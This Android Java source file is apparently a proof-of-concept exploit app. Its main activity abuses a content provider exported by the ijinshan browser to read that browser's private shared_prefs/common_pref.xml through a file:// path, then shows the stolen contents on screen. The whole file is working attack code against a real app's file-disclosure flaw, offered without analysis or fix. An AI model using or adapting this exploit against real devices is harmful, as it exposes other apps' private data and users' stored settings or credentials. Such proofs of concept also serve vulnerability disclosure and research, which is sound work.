package com.wnagzihxa1n.pocapk;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import java.io.FileInputStream;
import java.net.URLDecoder;

public class MainActivity extends Activity {

    private TextView textView;
    static final String TAG = "toT0C";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) findViewById(R.id.text);
        ContentResolver contentResolver = getContentResolver();

        FileInputStream fileInputStream = null;
        Uri uri_openfile = Uri.parse("content://com.ijinshan.htmlfileprovider/file:///data/data/com.ijinshan.browser/shared_prefs/common_pref.xml");
        try {
            fileInputStream = (FileInputStream) contentResolver.openInputStream(uri_openfile);
            byte[] data = new byte[fileInputStream.available()];
            fileInputStream.read(data);
            textView.setText(new String(data));
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                fileInputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
